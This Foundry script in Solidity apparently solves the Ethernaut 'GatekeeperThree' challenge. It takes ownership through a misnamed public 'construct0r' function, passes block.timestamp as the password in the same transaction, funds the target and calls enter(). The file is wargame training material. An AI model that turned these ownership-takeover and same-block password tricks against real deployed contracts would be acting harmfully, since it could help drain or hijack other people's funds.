// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Enter {
    function enterGates(GatekeeperThree gateKeeperThreeInstance) external {
        gateKeeperThreeInstance.construct0r();
        gateKeeperThreeInstance.createTrick();
        gateKeeperThreeInstance.getAllowance(block.timestamp);

        gateKeeperThreeInstance.enter();
    }
}

contract GatekeeperThreeSolution is Script {
    GatekeeperThree public constant gateKeeperThreeInstance =
        GatekeeperThree(payable(0x7FCCd9d9598D2ACf29D7396D787fa2715927E29b));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Enter enter = new Enter();
        address(gateKeeperThreeInstance).call{value: 0.002 ether}("");
        enter.enterGates(gateKeeperThreeInstance);
        vm.stopBroadcast();
    }
}
